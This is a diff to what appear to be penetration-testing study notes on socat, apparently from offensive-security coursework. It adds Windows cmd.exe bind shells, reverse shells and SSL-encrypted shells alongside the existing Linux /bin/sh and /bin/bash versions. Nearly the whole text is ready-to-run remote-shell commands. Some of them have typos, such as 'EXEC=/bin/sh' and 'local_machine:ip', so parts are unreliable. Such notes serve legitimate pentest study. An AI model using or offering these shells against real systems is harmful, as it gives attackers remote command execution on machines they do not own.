@@ -25,6 +25,8 @@ $nc -nv remote_machine_ip 4444
 Remote machine
 $ socat TCP-LISTEN:4444 EXEC:/bin/sh
 
+C:\>Users\offsec> socat -d -d TCP4-LISTEN:4443 EXEC:'cmd.exe',pipes
+
 Local machine
 $ socat - TCP4:remote_machine_ip:4444
 
@@ -37,6 +39,8 @@ $ socat -d -d TCP-LISTEN:4444 STDOUT
 
 Remote machine
 $ socat TCP4:remote_machine_ip:4444 EXEC:/bin/bash
+
+C:\Users\offsec> socat TCP4:192.168.168.1:4443 EXEC:'cmd.exe',pipes.
 
 -------------------------------------------------------------------
 
@@ -53,11 +57,20 @@ $ cat bind_shell.key bind_shell.crt > bind_shell.pem
 - Listen for connections
 $ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin /bash
 
+C:\Users\offsec> socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork EXEC:'cmd.exe',pipes
+
 Client machine
 $ socat - OPENSSL:remote_ip:443,verify=0
 
 -------------------------------------------------------------------
+** SSL SOCAT REVERSE SHELL
 
+Local machine
+$ socat -d -d OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork STDOUT
+
+Remote machine
+$ socat OPENSSL:local_machine:ip:4443,verify=0 EXEC=/bin/sh
+C:\Users\far2ed> $ socat OPENSSL:local_machine:ip:4443,verify=0 EXEC:'cmd.exe',pipes
 
 
 
